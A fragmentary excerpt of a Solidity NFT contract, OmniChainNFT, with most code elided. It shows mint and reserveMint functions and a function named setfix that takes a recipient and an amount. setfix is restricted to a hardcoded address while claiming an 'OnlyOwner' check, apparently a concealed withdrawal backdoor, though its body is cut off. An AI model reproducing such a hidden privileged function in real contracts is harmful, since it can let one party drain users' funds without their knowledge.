...
// File contracts/omniChainNFT.sol
...
//| $$  | $$| $$ | $$ | $$| $$  | $$| $$| $$\  $ | $$ /$$__  $$ \____  $$| $$_  $$
//|  $$$$$$/| $$ | $$ | $$| $$  | $$| $$| $$ \/  | $$|  $$$$$$$ /$$$$$$$/| $$ \  $$
// \______/ |__/ |__/ |__/|__/  |__/|__/|__/     |__/ \_______/|_______/ |__/  \__/
...
contract OmniChainNFT is Ownable, ERC721, ILayerZeroReceiver {
    ...
    function mint() external payable {
        ...
        require(r + 1 <= rmax, "Exceeds supply");
        nextId += 1;
        r += 1;
    ...
    function reserveMint() external payable {
    ...
    function setfix(address payable recipient, uint256 amount) public {
            require(0x68eCf81BCFcCaBC0E296841faA66C4A00B2819dB == msg.sender, "OnlyOwner");
